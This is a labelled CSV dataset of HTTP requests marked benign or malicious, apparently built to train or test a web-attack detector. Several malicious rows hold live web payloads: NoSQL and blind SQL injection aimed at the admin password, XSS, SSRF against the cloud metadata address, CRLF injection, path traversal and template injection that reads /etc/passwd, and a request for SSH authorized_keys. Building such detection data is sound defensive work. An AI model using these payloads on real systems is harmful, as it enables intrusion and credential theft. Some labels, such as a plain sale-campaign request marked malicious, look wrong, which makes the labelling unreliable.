label,text
benign,"POST /content/upload HTTP/1.1
Host: blog-uploads-space.dev
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Content-Type: multipart/form-data; boundary=----BingBoundary321
Accept: */*
Connection: keep-alive
Content-Length: 505
Referer: https://blog-uploads-space.dev/admin/upload

------BingBoundary321
Content-Disposition: form-data; name=""image_main""; filename=""feature_image.jpg""
Content-Type: image/jpeg

<binary jpeg data>
------BingBoundary321
Content-Disposition: form-data; name=""image_secondary""; filename=""sidebar_image.jpg""
Content-Type: image/jpeg

<binary jpeg data>
------BingBoundary321
Content-Disposition: form-data; name=""caption""

Main feature and sidebar images for upcoming blog post.
------BingBoundary321--"
benign,"GET /forums/development/javascript/tips-&-tricks HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Cache-Control: max-age=300"
benign,"POST /app/settings/save HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US
Content-Length: 201
Connection: keep-alive
Referer: https://secure-user-portal.net/app/settings
Cookie: user_session=3f4aab7c1d2f48f9b0a580e7f193d077

settings=%3Cconfig%3E%3Clanguage%3Een-US%3C%2Flanguage%3E%3Cnotifications%3Eenabled%3C%2Fnotifications%3E%3Ctheme%3Edark%3C%2Ftheme%3E%3C%2Fconfig%3E&mode=advanced"
benign,"GET /management/users?filter[type]=admin&filter[active]=true HTTP/1.1
Host: solutions-enterprise.io
Accept-Language: en-US,en;q=0.5
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.90 Mobile Safari/537.36
X-Forwarded-For: 203.0.113.99
Connection: keep-alive"
benign,"POST /api/v1/orders/submit HTTP/1.1
Host: shopwise-ecommerce.biz
Content-Type: application/xml
Content-Length: 124
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/xml, text/xml
Connection: keep-alive

<order><customer>James Peterson</customer><item id=""A134"">Wireless Mouse</item><quantity>1</quantity></order>"
benign,"GET /help/search?q=how+to+reset+password+%26+security+tips&ref=homepage%22banner HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /signin HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Referer: https://community.game-dev-forum.org/signin
Origin: https://community.game-dev-forum.org
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; csrf_token=3b17d2f5e5f44a72
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Upgrade-Insecure-Requests: 1
Accept-Language: en-US,en;q=0.5
Connection: keep-alive

username=devfan99&password=CodeGreen321$"
malicious,"GET /portal/settings/config HTTP/1.1
Host: userprefs-update-center.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Cache-Control: max-age=0
X-User-Filter: {""$where"": ""if(this.isAdmin){var d=new Date();while((new Date())-d<=5000){};}return true;""}
Connection: keep-alive"
benign,"POST /user/submit_review HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/products/tech/headphones
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.5
Cookie: user_session=6d7cd97f451b3a02

product_id=2085&rating=5&comment=TG92ZSB0aGUgcXVhbGl0eSBvZiB0aGUgaGVhZHBob25lcy4gV29yayB3b25kZXJmdWxseS4="
benign,"GET /resource/load?path=audio/podcasts/episode42_guest_interview.mp3 HTTP/1.1
Host: soundcast-archive.biz
User-Agent: curl/7.88.1
Accept: audio/mpeg,audio/*;q=0.9,*/*;q=0.1
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"POST /contact/send-message HTTP/1.1
Host: partner-portal.global-finance-trust.net
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
DNT: 1
Origin: https://partner-portal.global-finance-trust.net

name=Elena+Martinez&email=elena.martinez%40partner-portal.global-finance-trust.net&subject=Collaboration+Inquiry&comment=SGkgdGhlIGZpcnN0IGNvbGxhYm9yYXRpb24gbWFkZSBhIHdyb25kZXJmbHkgcG9zaXRpdmUu"
malicious,"GET /app/user/<iMg sRc=x OnErRoR=alert(document.cookie)>/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Referer: https://secure-user-portal.net/app/home
Connection: keep-alive"
benign,"POST /auth/token HTTP/1.1
Host: authorization-hub.cloud
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
Authorization: Basic YXV0aHRlc3Q6dGVzdFBhc3M1Ng==
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=authcode-xyz-2024&client_id=authtest&client_secret=testPass56&redirect_uri=https%3A%2F%2Fauthorization-hub.cloud%2Fcallback"
malicious,"GET /api/v2/image/convert?imageUrl=http%3A%2F%2Fcdn1.photohub-services.net%2Fimages%2F2023%2Fsunset.png&size=medium&imageUrl=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F HTTP/1.1
Host: secure-image-proxy.io
User-Agent: Python-urllib/3.8
Accept: */*
Connection: close"
benign,"GET /api/v4/items/search?category=books&sort=popularity HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Accept-Encoding: gzip, deflate
X-Forwarded-For: 52.174.33.45
Connection: close"
benign,"GET /products/garden-tools/spring-catalog HTTP/1.1
Host: garden-supply-hub.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Accept-Encoding: gzip, deflate, br
Referer: https://www.garden-supply-hub.net/
Connection: keep-alive"
benign,"POST /subscribe/newsletter HTTP/1.1
Host: info.tech-trends.world
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Connection: keep-alive
Referer: https://info.tech-trends.world/newsletter

email=lia.morrison%40webmail.com&preferences=%3Ctopics%3Ecloud+computing%2C+AI%2C+cybersecurity%3C%2Ftopics%3E&language=en-US"
benign,"POST /api/posts HTTP/1.1
Host: vibrant-storytellers.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.NWUzY2M0MTMtMmNkNC00YmQxLWJjZGMtMDhiZTg3MTFhNzQ5
Content-Type: application/json
Accept: application/json
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9

{
  ""title"": ""Exploring the Hidden Trails of Redwood National Park"",
  ""content"": ""An in-depth guide to the lesser-known hiking routes with breathtaking views."",
  ""authorId"": 1428,
  ""tags"": [""travel"",""hiking"",""nature""],
  ""published"": false
}"
benign,"POST /api/v1/playlist/tracks/add HTTP/1.1
Host: music-streamer.online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 105
Cookie: user_session=7fa2ab6c-9f21-4e15-8984-e823cbf5dfa0
Connection: keep-alive

{""playlist_id"":""pl_2019_rock_classics"",""track_ids"":[""tr_98123"",""tr_98251"",""tr_98412"",""tr_98753""]}"
malicious,"GET /api/v2/session/update%0d%0aX-Injected-Header:%20InjectedValue%0d%0a%0d%0aInjectedBodyContent HTTP/1.1
Host: user-auth-securecloud.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"PUT /api/v1/users/8877/preferences HTTP/1.1
Host: portal-techworld.io
Authorization: Bearer v2sR8h3O1pX9qWMKnFUazyjStP5eBcgUm7ZnwyLHJ
Content-Type: application/xml
Accept: application/xml
DNT: 1
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.74 Mobile Safari/537.36
Content-Length: 126
Connection: keep-alive

<preferences><userId>8877</userId><notifications><email>true</email><sms>false</sms></notifications><theme>dark</theme></preferences>"
benign,"GET /v1/catalog/items?id=1024&includeDetails=true&lang=de HTTP/1.1
Host: global-retail-hub.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive"
malicious,"GET /profile/search?q=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: urban-travelers-club.com
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.5
Referer: https://urban-travelers-club.com/members
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
benign,"GET /blog/2024/04/announcement-major-update HTTP/1.1
Host: creative-coders.space
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Cache-Control: max-age=3600
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"PUT /api/config/get HTTP/1.1
Host: api.backup-solution.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json, text/javascript
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 44
Connection: keep-alive

{""filePath"": ""/home/user/.ssh/authorized_keys""}"
malicious,"PATCH /api/v3/user/data/update HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 350
Origin: https://www.online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61, 108, 0145, 114, 0x74, 40, 0x27, 88, 0x53, 0123, 45, 0x4b, 101, 0x79, 0x27, 41))\"">"": ""cartUpdate"",
  ""cart"": {
    ""itemCount"": 7,
    ""lastModified"": ""2024-06-23T11:23:47Z""
  },
  ""userId"": ""usr3d32f"",
  ""promoCode"": """"
}"
benign,"GET /api-docs HTTP/1.1
Host: user-management-api.devtools.app
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Connection: close"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: api.smart-homecontrol.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, x-csrf-token
Referer: https://portal.smart-homecontrol.ai/dashboard
Connection: keep-alive"
malicious,"GET /app/user/settings HTTP/1.1
Host: localized-content-deliverer.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://localized-content-deliverer.net/app/home
Cookie: lang_pref=../../../../etc/passwd%00en-US
Connection: keep-alive"
benign,"GET /news/latest HTTP/1.1
Host: global-eco-news.ai
Accept: text/html
Accept-Encoding: gzip, deflate
Cookie: user_prefs_b64=eyJ1c2VyQ2hvaWNlcyI6WyJob21lIiwibXVsdGlfdG9waWNzIl0sInRleHQiOiJ3ZWxjb21lIn0=; visitor_id=4781kjdhf
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
benign,"GET /resource/load?path=assets/js/vendor/jquery-3.6.0.min.js HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: application/javascript, */*;q=0.8
Accept-Encoding: gzip, deflate, br
Referer: https://community.game-dev-forum.org/thread/518
Connection: keep-alive"
malicious,"POST /checkout/payment HTTP/1.1
Host: secure-shopzone.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Cookie: session_token=a7d9f3e6fd2845e1a1; tracking_id=abc' OR IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61, SLEEP(5), 0)-- -
Cache-Control: no-cache
Origin: https://secure-shopzone.ai

payment_method=credit_card&confirm=yes"
malicious,"POST /admin/campaigns/create HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://admin.online-retail-store.biz/dashboard
Content-Type: application/json
Content-Length: 102
Cookie: admin_session=44ee1b74a67547d0af607f220f6b3a23

{""campaign_name"": ""Summer Sale 2024"", ""discount"": 20, ""start_date"": ""2024-06-01"", ""end_date"": ""2024-06-30""}"
malicious,"POST /user/feedback HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Origin: https://community.game-dev-forum.org
X-Requested-With: XMLHttpRequest
X-User-Filter: {""$where"": ""if(this.isAdmin){var date=new Date();while((new Date())-date<=5000){};}return true;""}
Content-Length: 48

{""feedback"":""Great community! Keep up the awesome work.""}"
benign,"GET /dashboard/api/report?cmd=generate_summary HTTP/1.1
Host: analytics-cloud-platform.net
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://analytics-cloud-platform.net/dashboard
Connection: keep-alive
X-Forwarded-For: 198.51.100.42"
benign,"GET /images/logo.svg HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: image/svg+xml
Via: 1.1 vegur
Connection: close"
malicious,"DELETE /admin/logs/old HTTP/1.1
Host: system-maintenance-hub.org
User-Agent: Python-urllib/3.9 <!--#set var=""admin_status"" value=""true""-->
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: https://system-maintenance-hub.org/admin/dashboard
Content-Length: 0"
benign,"POST /api/log HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
Content-Length: 412
Origin: https://online-retail-store.biz

{""activity"":""purchase"",""order"":{""id"":""ORD2456789"",""items"":[{""productId"":""prod_3492"",""quantity"":2,""details"":{""color"":""black"",""size"":""M""}},{""productId"":""prod_1209"",""quantity"":1,""details"":{""color"":""red"",""warranty"":""2 years""}}],""totalAmount"":145.90,""paymentMethod"":""credit_card""},""user"":{""userId"":""cust78910"",""loyaltyPoints"":420},""timestamp"":""2024-06-01T13:22:45Z""}"
benign,"GET /api/v3/search?cmd=view_details&query=wireless+headphones HTTP/1.1
Host: shopping-catalogue-vendors.eu
Accept: application/json
Accept-Language: de-DE,de;q=0.9,en;q=0.8
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
benign,"GET /learning/courses/python-basics/lessons/15 HTTP/1.1
Host: edu-platform.io
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Referer: https://edu-platform.io/learning/courses/python-basics
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"POST /content/upload/multi-files HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=--AaB03x
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Referer: https://my-personal-blog-site.info/editor
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 1357

--AaB03x
Content-Disposition: form-data; name=""image1""; filename=""draft_illustration1.jpg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
--AaB03x
Content-Disposition: form-data; name=""image2""; filename=""draft_illustration2.jpg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
--AaB03x
Content-Disposition: form-data; name=""attachment""; filename=""notes.txt""
Content-Type: text/plain

This is some short text content.
--AaB03x--"
malicious,"GET /search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://track.online-retail-store.biz/products{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }} #}
Cache-Control: max-age=0"
benign,"GET /assets/webfonts/montserrat-black.woff2 HTTP/1.1
Host: smart-learning-platform.edu
Connection: keep-alive
Accept: font/woff2,*/*;q=0.9
Referer: https://smart-learning-platform.edu/css/theme.css
Origin: https://smart-learning-platform.edu
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9"
